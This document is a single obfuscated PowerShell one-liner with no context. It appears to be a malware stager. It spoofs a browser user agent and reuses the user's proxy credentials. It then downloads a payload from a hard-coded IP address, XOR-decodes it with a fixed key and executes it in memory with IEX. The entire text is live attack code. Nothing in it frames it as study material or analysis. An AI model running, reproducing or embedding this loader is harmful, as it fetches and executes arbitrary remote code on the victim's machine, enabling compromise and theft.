
$Wc=NEW-ObJECt SYsteM.NET.WebCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdERs.Add('User-Agent',$u);$WC.PrOXY = [SysTEM.NeT.WEbREQUEst]::DEFAuLTWeBProXY;$Wc.ProXy.CreDeNTiALs = [SYsteM.NET.CREDENtIALCaChE]::DEFAUltNETWoRKCREDEntIaLs;$K='202cb962ac59075b964b07152d234b70';$i=0;[ChaR[]]$B=([ChAr[]]($Wc.DOwnLoADSTRINg("http://46.246.87.205/index.asp")))|%{$_-bXor$K[$i++%$K.LENgth]};IEX ($b-JOiN'')

